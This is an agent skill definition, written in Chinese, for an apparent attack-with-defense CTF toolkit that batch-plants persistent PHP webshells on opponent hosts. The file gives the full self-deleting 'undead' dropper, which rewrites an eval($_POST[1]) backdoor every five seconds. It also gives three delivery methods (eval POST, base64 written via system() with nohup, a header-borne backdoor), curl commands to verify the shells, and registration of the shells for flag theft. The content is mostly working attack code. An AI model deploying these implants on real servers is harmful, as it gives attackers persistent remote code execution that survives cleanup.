---
name: awd-shell
description: 从 AWD-Red 平台 (platform.db 或 awd.db) vulns 表批量向存活目标种不死马，成功后登记到 backdoors 表（shell_url + flag_cmd）。只做种马，不执行 flag。
---

# AWD 批量种不死马 (awd-shell)

优先从 **AWD-Red 平台数据库** (`data/platform.db`) 及 `config/targets.txt` 读取漏洞与对手靶机，向所有存活目标批量种不死马。种成功后自动登记到 `backdoors` 表。

**只做种马 + 登记，不执行 flag 命令。** flag 提取由平台 PoC 调度或 `awd-flags` 负责。

## 使用方式

```bash
# 批量种不死马 + 登记 flag 命令
python3 skills/awd-shell/scripts/awd_shell.py run \
  --flag-cmd 'curl http://10.0.0.1/get_flag' --json

# 只种 eval 类型
python3 skills/awd-shell/scripts/awd_shell.py run --type eval --json

# 只种指定文件（子串匹配）
python3 skills/awd-shell/scripts/awd_shell.py run --file index.php --json

# 指定目标 IP
python3 skills/awd-shell/scripts/awd_shell.py run --targets 192.168.1.101 192.168.1.102 --json

# dry-run 只看 payload 不发送
python3 skills/awd-shell/scripts/awd_shell.py run --dry-run --json
```

## 种马流程

```
vulns 表 → 按类型生成 payload → POST 到漏洞入口 → 写入 dropper → GET 触发 → 验证 curl.php → 登记 backdoors 表
```

| vuln_type | 投递方式 | 说明 |
|-----------|---------|------|
| `eval` | POST 参数直接 `file_put_contents` 写 dropper，再 GET 触发 | `POST dbapp@2020=file_put_contents(...)` |
| `cmd` | POST 参数通过 `system()` 写 /tmp 再 `nohup php &` | `POST c=echo ... \| base64 -d > /tmp/x.php && nohup php ...` |
| `backdoor` | 通过 HTTP 头传 base64 编码的 dropper | `curl -H "__c: <base64>"` |

## 不死马 Payload（稳健版）

```php
<?php
error_reporting(0);
unlink(__FILE__);
ignore_user_abort(true);
set_time_limit(0);
while (1) {
    file_put_contents(__DIR__ . '/curl.php', '<?php eval($_POST[1]);?>');
    sleep(5);
}
?>
```

行为：
1. 第一次访问时删除自身（dropper 消失）
2. 进入无限循环，每 5 秒在**同目录**写 `curl.php`
3. `curl.php` 内容：`<?php eval($_POST[1]);?>`
4. 即使 `curl.php` 被删，下一轮也会重写
5. `ignore_user_abort(true)` 保证 curl 断开后进程继续跑

## 验证不死马

```bash
curl -sS -X POST 'http://<target>/<dir>/curl.php' --data-urlencode '1=echo "SHELL_OK";'
```

## 数据库依赖

- 数据库：`data/platform.db` 或 `skills/awd-asset/data/awd.db`
- 读取 `vulns` 表（`vuln_type IN eval/cmd/backdoor`）和 `targets` 表（`status=alive, role=opponent`）
- 写入 `backdoors` 表（种马成功后登记 shell_url + flag_cmd）

`backdoors` 表结构：
```sql
CREATE TABLE backdoors (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    app TEXT NOT NULL,
    file TEXT NOT NULL,          -- 漏洞文件路径
    password TEXT NOT NULL,      -- 参数名（如 dbapp@2020）
    method TEXT DEFAULT 'POST',
    shell_type TEXT DEFAULT 'eval',
    sample_payload TEXT,         -- 不死马 shell_url
    defense_action TEXT DEFAULT 'delete',
    flag_cmd TEXT,              -- flag 获取命令（供 awd-getflag 消费）
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## 输出

```json
{
  "targets": ["192.168.1.101", "192.168.1.102"],
  "vulns": [{"file": "index.php", "type": "eval", "param": "test_param"}],
  "results": [
    {"target": "192.168.1.101", "file": "index.php", "ok": true, "verified": true, "shell_url": "http://192.168.1.101/curl.php"}
  ],
  "summary": {"total": 2, "success": 2, "verified": 2, "failed": 0}
}
```

## 约束

- 同文件多个漏洞类型只取一条投递（去重）
- `__DIR__` 保证 `curl.php` 和 dropper 同目录
- 1-3 个目标串行更快；>3 个目标自动多线程
- 种马成功后 `backdoors` 表登记 `sample_payload`（shell_url）+ `flag_cmd`，供 `awd-flags` 消费

## 与其他 skill 的关系

```
awd-vul（扫描出漏洞）→ vulns 表
awd-shell（种不死马）→ backdoors 表（shell_url + flag_cmd）
awd-getflag（执行 flag 命令）→ flags 表
```

- `awd-vul` 扫描出漏洞 → 写入 `vulns` 表
- **`awd-shell` 从 `vulns` 表读漏洞 → 种不死马 → 写入 `backdoors` 表**
- `awd-flags` 从 `backdoors` 表读 `sample_payload` + `flag_cmd` → 执行 flag 命令 → 写入 `flags` 表
